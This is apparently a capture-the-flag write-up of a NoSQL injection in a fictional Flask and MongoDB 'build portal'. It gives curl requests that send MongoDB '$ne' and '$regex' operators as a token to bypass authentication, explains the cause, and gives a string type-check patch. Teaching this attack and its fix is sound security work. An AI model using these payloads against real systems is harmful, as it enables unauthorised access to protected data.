# Service 9 — Blockstar Build Portal: Writeup

## 1. Service Number and Name
**Service 9 — Blockstar Games Internal Build Portal** (NoSQL Injection)
An internal developer build-distribution portal backed by MongoDB,
running on port `8009`.

---

## 2. How to Exploit It — Step by Step

**Step 1 — Recon the public catalog**
```bash
curl -s http://<target>:8009/api/builds | jq
```
Four titles show full details. One entry has `"classified": true` and a
hidden name — note its `game_id` (e.g. `gta7`).

**Step 2 — Confirm the obvious attempt fails**
```bash
curl -s -X POST http://<target>:8009/api/download_build \
  -H "Content-Type: application/json" \
  -d '{"game_id": "gta7", "dev_token": "guess-a-token"}'
```
→ `404 No build found`. The real token is a random 64-character string — not guessable.

**Step 3 — Send a MongoDB operator instead of a string**
```bash
curl -s -X POST http://<target>:8009/api/download_build \
  -H "Content-Type: application/json" \
  -d '{"game_id": "gta7", "dev_token": {"$ne": ""}}'
```
**Result:**
```json
{"status":"success","message":"Build access granted.","game":"Grand Theft Aunty VII","build":"UNRELEASED / INTERNAL-ONLY","download_url":"https://cdn.blockstar-internal.local/builds/gta7/package.zip?sig=...","flag":"HS{blockstar_nosql_unreleased_asset_leaked}"}
```

**Step 3b — Equivalent payload (if `$ne` is ever blocked specifically)**
```bash
curl -s -X POST http://<target>:8009/api/download_build \
  -H "Content-Type: application/json" \
  -d '{"game_id": "gta7", "dev_token": {"$regex": "^.*"}}'
```

---

## 3. Why the Service Is Exploitable

When Flask parses a JSON request body with `request.get_json()`, each
field becomes whatever Python type the JSON represented: a quoted string
becomes a Python `str`, but a `{ ... }` becomes a Python `dict`. Nothing
in a normal Flask route stops a client from sending an object where a
string was expected.

The vulnerable line:
```python
record = builds.find_one({"game_id": game_id, "dev_token": dev_token})
```
passes `dev_token` into the MongoDB query filter exactly as received —
string or not. MongoDB's query language treats a dict with a `$`-prefixed
key as an **operator**, not a value to compare against:
- `{"$ne": ""}` means "not equal to the empty string" — true for every
  real document.
- `{"$regex": "^.*"}` means "matches this pattern" — also true for
  everything.

So instead of comparing `dev_token` for equality against the stored
value (`"abc123..." == "abc123..."`), the attacker gets MongoDB to
answer a completely different question ("does *any* token exist here?")
— and the real 64-character secret never needs to be known, guessed, or
brute-forced.

This is the NoSQL sibling of classic SQL injection: **untrusted input
reaching a query engine without being constrained to the shape the
developer assumed it would always have.**

---

## 4. How to Patch It

**File:** `app.py`
**Function:** `download_build()` (`POST /api/download_build`)

Add a type check immediately after confirming both fields are present,
and before the database call:

```python
# ... existing code ...
if game_id is None or dev_token is None:
    return jsonify({
        "status": "error",
        "message": "Both 'game_id' and 'dev_token' are required.",
    }), 400

# ADD THIS — reject anything that isn't a plain string before it
# ever reaches the MongoDB query filter.
if not isinstance(game_id, str) or not isinstance(dev_token, str):
    return jsonify({
        "status": "error",
        "message": "'game_id' and 'dev_token' must be strings.",
    }), 400

try:
    record = builds.find_one({"game_id": game_id, "dev_token": dev_token})
# ... existing code ...
```

This rejects any JSON object, array, number, or boolean sent in either
field — including `{"$ne": ""}` and `{"$regex": "..."}` — before PyMongo
ever sees them, while leaving genuine string lookups untouched.

**Verify:**
1. Re-run Step 3/3b above → should now return `400 'game_id' and 'dev_token' must be strings.`
2. Confirm legitimate flows still work: a real token for a non-classified
   build (e.g. `bar1`) should still return `200` with a `download_url`.

---

## 5. What You Learn

- **Validate the *type*, not just the presence, of user input.** Checking that a field exists (`is not None`) is not the same as checking that it's the type your code assumes — a request with no `dev_token` key and a request with `dev_token: {}` both "pass" an existence check but behave very differently downstream.
- **Any query language — SQL, NoSQL, LDAP, shell — is dangerous once untrusted data reaches it unconstrained.** NoSQL databases aren't immune to injection just because they don't use SQL syntax; MongoDB's operator-as-dict design means a JSON API is *inherently* injection-prone unless input types are enforced.
- **"It's just JSON" isn't a safety guarantee.** JSON's flexibility (strings, numbers, objects, arrays all valid in the same field) is exactly what makes this attack possible — the wire format accepting more shapes than your code logically expects is the vulnerability.
- **Fix at the boundary, not deep in the logic.** The patch doesn't touch MongoDB, the query, or any business logic — it rejects malformed input the moment it enters the system, which is both the simplest and most robust place to enforce an invariant.